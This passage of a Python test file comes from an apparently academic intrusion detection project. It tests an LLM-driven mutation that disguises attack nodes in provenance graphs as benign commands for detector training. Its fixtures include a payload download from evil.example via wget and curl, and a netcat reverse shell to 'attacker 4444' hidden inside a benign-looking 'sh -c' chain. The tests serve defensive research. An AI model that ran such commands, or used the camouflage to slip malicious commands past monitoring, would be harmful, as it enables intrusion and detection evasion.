    assert payload["events"][0]["arguments"].endswith("https://evil.example/payload")
    assert payload["events"][0]["path"] == "/usr/bin/wget"
    wl_label = _node_initial_label(mutated, 0)
    assert "command=curl" in wl_label
    assert "https://evil.example/payload" in wl_label
    assert "path=/usr/bin/wget" in wl_label

    training = ig.Graph(directed=True)
    training.add_vertex(type="process", properties=context_property, label=0)
    _ops, type_attrs = build_historical_profiles([(training, None)])
    assert check_attribute_feasibility(mutated, {0}, type_attrs) is True


def test_atlas_multi_event_property_contributes_every_process_observation():
    prop = json.dumps({
        "entity_type": "process",
        "events": [
            {"event_id": "e1", "role": "actor", "action": "read", "command": "reader", "arguments": "--first", "path": "/tmp/a"},
            {"event_id": "e2", "role": "actor", "action": "write", "command": "writer", "arguments": "--second", "path": "/tmp/b"},
        ],
    }, sort_keys=True)
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["type"] = ["process", "file"]
    graph.vs["properties"] = [prop, "/tmp/target"]
    graph.vs["label"] = [0, 0]
    graph.add_edge(0, 1, actions="write")

    commands, arguments, _files = _collect_benign_corpus([(graph, None)])
    entity_ops, _attrs = build_historical_profiles([(graph, None)])

    assert commands == {"reader", "writer"}
    assert arguments == {"--first", "--second"}
    assert entity_ops["type:process|command:writer"] == {"write"}
    assert entity_ops["type:process|command:reader"] == {"read"}

    runtime = ig.Graph(directed=True)
    runtime.add_vertices(2)
    runtime.vs["type"] = ["process", "file"]
    runtime.vs["properties"] = [prop, "/tmp/target"]
    runtime.add_edge(
        0, 1, actions="write", event_id="e2", _athena_introduced_edge=True,
    )
    assert check_operation_legality(runtime, {0, 1}, entity_ops) is True
    runtime.es[0]["actions"] = "read"
    assert check_operation_legality(runtime, {0, 1}, entity_ops) is False


def test_proof_replacement_wget_to_curl_preserves_url_and_passes_profiles():
    attack = ig.Graph(directed=True)
    attack.add_vertices(3)
    attack.vs["type"] = ["process", "file", "process"]
    attack.vs["properties"] = [
        "wget https://evil.example/payload,1,/usr/bin/wget",
        "/tmp/payload",
        "curl -H X-Health-Check:true,2,/usr/bin/curl",
    ]
    attack.vs["label"] = [1, 1, 0]
    attack.vs["_athena_boundary_context"] = [False, True, True]
    attack.add_edge(0, 1, actions="read", _athena_boundary_edge=True)
    attack.add_edge(2, 0, actions="read")

    mutated = apply_semantic_mutation_llm(
        attack,
        [0],
        benign_commands={"wget", "curl"},
        benign_args={"-H X-Health-Check:true"},
        llm_fn=lambda _prompt: json.dumps({
            "new_command_name": "curl",
            "new_arguments": "-H X-Health-Check:true https://evil.example/payload",
        }),
    )
    assert mutated is not None

    history = ig.Graph(directed=True)
    history.add_vertices(2)
    history.vs["type"] = ["process", "file"]
    history.vs["properties"] = [
        "curl -H X-Health-Check:true,9,/usr/bin/curl", "/tmp/benign",
    ]
    history.vs["label"] = [0, 0]
    history.add_edge(0, 1, actions="read")
    entity_ops, type_attrs = build_historical_profiles([(history, None)])

    assert check_operation_legality(mutated, {0, 1}, entity_ops) is True
    assert check_attribute_feasibility(mutated, {0}, type_attrs) is True


def test_replacement_rejects_attack_argument_reordering():
    graph = ig.Graph(directed=True)
    graph.add_vertex(type="process", properties="curl -c status,1,/bin/curl", label=1)
    assert apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"curl", "wget"},
        benign_args={"status -c"},
        llm_fn=lambda _prompt: (
            '{"new_command_name":"wget","new_arguments":"status -c"}'
        ),
    ) is None


@pytest.mark.parametrize("changed", ["-c   status", "'-c status'"])
def test_replacement_requires_verbatim_attack_argument_substring(changed):
    graph = ig.Graph(directed=True)
    graph.add_vertex(type="process", properties="curl -c status,1,/bin/curl", label=1)
    assert apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"curl", "wget"},
        benign_args={changed},
        llm_fn=lambda _prompt: json.dumps({
            "new_command_name": "wget", "new_arguments": changed,
        }),
    ) is None


def test_associated_attribute_propagation_uses_exact_token_boundaries():
    graph = ig.Graph(directed=True)
    graph.add_vertices(3)
    graph.vs["type"] = ["process", "file", "file"]
    graph.vs["properties"] = ["curl safe,1,/bin/curl", "/tmp/curling.log", "curl"]
    graph.add_edges([(0, 1), (0, 2)])

    _propagate_associated_attributes(graph, 0, "curl", "safe", "wget", "routine")

    assert graph.vs[1]["properties"] == "/tmp/curling.log"
    assert graph.vs[2]["properties"] == "wget"


def test_semantic_mutation_fails_closed_when_attack_component_is_lost():
    graph = ig.Graph(directed=True)
    graph.add_vertex(type="process", properties="evil safe,1,/bin/evil", label=1)

    result = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"curl"},
        benign_args={"safe"},
        llm_fn=lambda _prompt: '{"new_command_name":"curl","new_arguments":"safe"}',
    )

    assert result is None


def test_extension_draws_added_operation_only_from_explicit_boundary_context():
    graph = ig.Graph(directed=True)
    graph.add_vertices(3)
    graph.vs["type"] = ["process", "process", "process"]
    graph.vs["properties"] = [
        "evil secret,1,/bin/evil",
        "status check,2,/bin/status",
        "sh -c camouflage,3,/bin/sh",
    ]
    graph.vs["label"] = [1, 0, 0]
    graph.vs["_athena_boundary_context"] = [False, True, False]
    graph.add_edges([(1, 0), (2, 0)])
    graph.es["actions"] = ["inspect", "execute"]

    mutated = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"status", "sh", "camouflage"},
        benign_args={"check", "-c", "-c camouflage"},
        llm_fn=lambda _prompt: (
            '{"new_command_name":"sh",'
            '"new_arguments":"-c camouflage && evil secret"}'
        ),
    )

    assert mutated is None


def test_released_extension_prompt_example_executes_and_passes_full_verifier():
    graph = ig.Graph(directed=True)
    graph.add_vertices(4)
    graph.vs["type"] = ["process", "process", "process", "file"]
    graph.vs["properties"] = [
        "nc -e /bin/sh attacker 4444,1,/usr/bin/nc",
        "systemctl status nginx,2,/usr/bin/systemctl",
        'echo "connection test",3,/usr/bin/echo',
        "/tmp/network-check.log",
    ]
    graph.vs["label"] = [1, 0, 0, 0]
    graph.vs["_athena_boundary_context"] = [False, True, True, True]
    graph.add_edges([(1, 0), (2, 0), (0, 3)])
    graph.es["actions"] = ["inspect", "inspect", "execute"]
    graph.es[2]["_athena_introduced_edge"] = True

    response = json.dumps({
        "new_command_name": "sh",
        "new_arguments": (
            '-c "systemctl status nginx && nc -e /bin/sh attacker 4444 '
            '&& echo \\"connection test\\""'
        ),
    })
    mutated = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands={"sh", "systemctl", "echo"},
        benign_args={"-c", "status nginx", '"connection test"'},
        llm_fn=lambda _prompt: response,
    )
    assert mutated is not None

    history = ig.Graph(directed=True)
    history.add_vertices(2)
    history.vs["type"] = ["process", "file"]
    history.vs["properties"] = ["sh -c,9,/usr/bin/sh", "/tmp/safe.log"]
    history.vs["label"] = [0, 0]
    history.add_edge(0, 1, actions="execute")
    entity_ops, type_attrs = build_historical_profiles([(history, None)])
    passed, failed = verify_mutation(
        mutated, mutated.copy(), {0, 3}, entity_ops, type_attrs, delta_h=0.3,
    )
    assert passed is True, failed


@pytest.mark.parametrize(
    "original,benign_commands,benign_args,response",
    [
        (
            "curl secret,1,/bin/curl",
            {"curl", "wget"},
            {"safe"},
            '{"new_command_name":"curl","new_arguments":"secret"}',
        ),
        (
            "curl safe,1,/bin/curl",
            {"curl"},
            {"safe"},
            '{"new_command_name":"curl","new_arguments":"safe"}',
        ),
        (
            "evil secret,1,/bin/evil",
            {"status", "sh"},
            {"check", "-c"},
            '{"new_command_name":"evil","new_arguments":"secret"}',
        ),
    ],
)
def test_semantic_strategies_reject_no_op(
    original, benign_commands, benign_args, response,
):
    graph = ig.Graph(directed=True)
    graph.add_vertex(type="process", properties=original, label=1)

    assert apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands=benign_commands,
        benign_args=benign_args,
        llm_fn=lambda _prompt: response,
    ) is None


@pytest.mark.parametrize(
    "original,benign_commands,benign_args,response",
    [
        (
            "curl secret,1,/bin/curl",
            {"curl", "wget"},
            {"safe"},
            '{"new_command_name":"wget","new_arguments":"secret"}',
        ),
        (
            "evil safe,1,/bin/evil",
            {"curl", "wget"},
            {"safe", "routine"},
            '{"new_command_name":"evil","new_arguments":"routine"}',
        ),
        (
            "curl safe,1,/bin/curl",
            {"curl", "wget"},
            {"safe", "routine"},
            '{"new_command_name":"wget","new_arguments":"routine"}',
        ),
        (
            "evil secret,1,/bin/evil",
            {"status", "sh"},
            {"check", "-c"},
            '{"new_command_name":"sh","new_arguments":"-c status && evil secret"}',
        ),
    ],
)
def test_each_semantic_strategy_can_pass_component_whitelist(
    original, benign_commands, benign_args, response
):
    graph = ig.Graph(directed=True)
    graph.add_vertex(type="process", properties=original, label=1)
    if original.startswith("evil secret"):
        graph.add_vertex(
            type="process",
            properties="sh -c status,2,/bin/sh",
            label=0,
            _athena_boundary_context=True,
        )
        graph.add_edge(1, 0, actions="execute")
    mutated = apply_semantic_mutation_llm(
        graph,
        [0],
        benign_commands=benign_commands,
        benign_args=benign_args,
        llm_fn=lambda _prompt: response,
    )
    assert mutated is not None
    attrs = mutated.vs[0].attributes()
    assert attrs["_athena_semantic_strategy"] in {"replacement", "rewriting", "extension"}
    assert attrs["_athena_semantic_before"] != attrs["_athena_semantic_after"]
    assert attrs["_athena_semantic_changed_fields"]

    training = ig.Graph(directed=True)
    training.add_vertices(3)
    training.vs["type"] = ["process"] * 3
    training.vs["label"] = [0, 0, 1]
    training.vs["properties"] = [
        "wget routine,1,/bin/curl",
        "sh -c status check,1,/bin/evil",
        original,
    ]
    _entity_ops, type_attrs = build_historical_profiles([(training, None)])

    assert check_attribute_feasibility(mutated, {0}, type_attrs) is True


def test_benign_history_excludes_malicious_nodes_inside_benign_anchor_graphs():
    graph = ig.Graph(directed=True)
    graph.add_vertices(2)
    graph.vs["type"] = ["process", "process"]
    graph.vs["properties"] = ["safe arg,1,/bin/safe", "evil secret,2,/bin/evil"]
    graph.vs["label"] = [0, 1]

    commands, arguments, _files = _collect_benign_corpus([(graph, None)])

    assert commands == {"safe"}
    assert arguments == {"arg"}
    assert benign_anchor_indices(graph) == [0]


def test_verification_profiles_exclude_malicious_nodes_and_source_edges():
    graph = ig.Graph(directed=True)
    graph.add_vertices(3)
    graph.vs["type"] = ["process", "process", "file"]
    graph.vs["properties"] = [
        "safe arg,1,/bin/safe",
        "evil secret,2,/bin/evil",
        "/tmp/target",
    ]
    graph.vs["label"] = [0, 1, 0]
    graph.add_edges([(0, 2), (1, 2)])
    graph.es["actions"] = ["read", "delete"]

    entity_ops, type_attrs = build_historical_profiles([(graph, None)])

    assert set().union(*entity_ops.values()) == {"read"}
    process_values = set().union(*type_attrs["process"].values())
    assert "evil" not in process_values
    assert "secret" not in process_values


def test_augmented_loader_rejects_test_attack_donor(tmp_path):
    graph = ig.Graph(directed=True)
    graph.add_vertex(name="x", type="process", properties="x,1,/bin/x", label=1)
    with (tmp_path / "g.pkl").open("wb") as stream:
        pickle.dump(graph, stream)
    manifest = {
        "dataset": "cadets",
        "scene": "cadets314",
        "split_contract": {
            "mode": "date_partition_benign_days_and_attack_days",
            "donor_policy": "train_only",
            "train_snapshots": [0],
            "test_snapshots": [1],
        },
        "admitted": [{"graph": "g.pkl", "benign_snapshot": 0, "attack_snapshot": 1}],
    }
    (tmp_path / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")

    mutation_map, metadata = load_augmented_graphs(
        tmp_path,
        allowed_anchor_ids={0},
        allowed_attack_ids={0},
        expected_split={
            "mode": "date_partition_benign_days_and_attack_days",
            "train_snapshots": [0],
            "test_snapshots": [1],
        },
        expected_dataset="cadets",
        expected_scene="cadets314",
    )

    assert mutation_map == {}
    assert metadata["filtered_attack_graphs"] == 1


def test_complete_detection_requires_nonempty_split_bound_augmentation():
    with pytest.raises(RuntimeError, match="manifest"):
        validate_augmentation_mode("complete", {}, {"available": False})
    with pytest.raises(RuntimeError, match="admitted"):
        validate_augmentation_mode(
            "complete", {}, {"available": True, "manifest_admitted_count": 0},
        )
    validate_augmentation_mode(
        "complete",
        {0: [object()]},
        {"available": True, "manifest_admitted_count": 1, "loaded_graphs": 1},
    )
    validate_augmentation_mode("ablation-no-augmentation", {}, {})


def test_mlp_rejects_single_class_training():
    detector = MLPClassify(num_epochs=1)
    with pytest.raises(ValueError, match="malicious embeddings"):
        detector.train(np.zeros((2, 4), dtype=np.float32))
    with pytest.raises(ValueError, match="both benign and malicious labels"):
        detector.train(
            np.zeros((2, 4), dtype=np.float32),
            np.ones((2, 4), dtype=np.float32),
            malicious_labels=np.zeros(2, dtype=np.int64),
        )
